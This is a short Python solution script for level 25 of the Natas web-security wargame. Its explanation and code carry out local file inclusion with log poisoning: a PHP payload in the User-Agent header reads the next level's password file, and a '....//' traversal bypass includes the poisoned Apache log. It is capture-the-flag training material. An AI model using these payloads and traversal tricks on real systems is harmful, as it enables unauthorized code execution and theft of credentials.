import re
from src.natas.base_level import NatasLevel

class Level_25(NatasLevel):

  num = 25
  explanation = "LFI + Log Poisoning - Se inyecta PHP en el log de Apache a través del header User-Agent,\n     luego se incluye ese log mediante un LFI (bypass con `....//`)\n     para que el servidor ejecute el código inyectado y filtre la password."

  def exploit(self) -> str:

    PAYLOAD = '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
    self.session.get(self.base_url + "/index.php?lang=....//etc/passwd", headers = {"User-Agent": PAYLOAD})
    COOKIE  = self.session.cookies.get("PHPSESSID")
    resp    = self.session.get(self.base_url + f"/index.php?lang=....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{COOKIE}.log", headers = {'Cookie': f"PHPSESSID={COOKIE}"})
    match   = re.search(r'[a-zA-Z0-9]{32}', resp.text, re.MULTILINE).group()

    return match
